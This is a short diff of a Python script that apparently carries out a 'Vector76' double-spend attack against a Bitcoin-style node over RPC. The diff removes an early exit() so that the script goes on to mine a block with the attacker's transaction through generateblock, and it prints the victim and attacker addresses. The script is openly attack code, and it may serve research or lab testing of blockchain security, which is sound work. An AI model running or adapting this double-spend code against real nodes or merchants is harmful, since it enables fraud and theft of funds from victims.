@@ -97,14 +97,12 @@ tx_vector76 = rpc_node.fundrawtransaction(tx_vector76)["hex"]
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
 
 print(tx_vector76)
-exit()
 print("Mining Vector76 Block...")
 payload = [attacker_address, [tx_vector76], False]
 print(f"Payload : {payload}")
 vector76_respone = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
 print(f"Mining Response : {vector76_respone}")
 print()
-#result = rpc_node.sendrawtransaction(f"['{vector76_tx}']")
 print("--------------------")
 print(f"Victim      : {victim_address}")
 print(f"Attacker    : {attacker_address}")
